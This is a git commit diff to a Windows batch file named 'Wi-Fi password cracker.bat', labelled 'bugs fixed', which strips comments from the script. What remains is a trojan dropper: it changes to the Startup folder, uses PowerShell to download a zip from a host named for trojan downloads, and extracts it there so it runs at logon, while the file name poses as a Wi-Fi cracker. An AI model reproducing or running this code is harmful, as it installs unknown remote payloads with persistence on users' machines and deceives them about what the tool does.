2b460fdc84b9b36ff24050d94a4d93a94fdd44b7
Varun Banka <88031057+VarunBanka@users.noreply.github.com>
2022-10-01 14:40:54 +0530

    bugs fixed

--- Wi-Fi password cracker.bat
+++ Wi-Fi password cracker.bat
@@ -1,13 +1,9 @@
-rem echo off
 @echo off
 
-rem cd to startup folder
 cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
 
-rem download the file
 powershell -Command "Invoke-WebRequest https://downloads-for-trojan-by-varun-banka.netlify.app/my_zip_file.zip -OutFile my_zip_file.zip"
 
-rem unzip the downloaded file
 powershell -command "Expand-Archive -Force '%~dp0my_zip_file.zip' '%~dp0'"
 
-rem code by varun banka
+
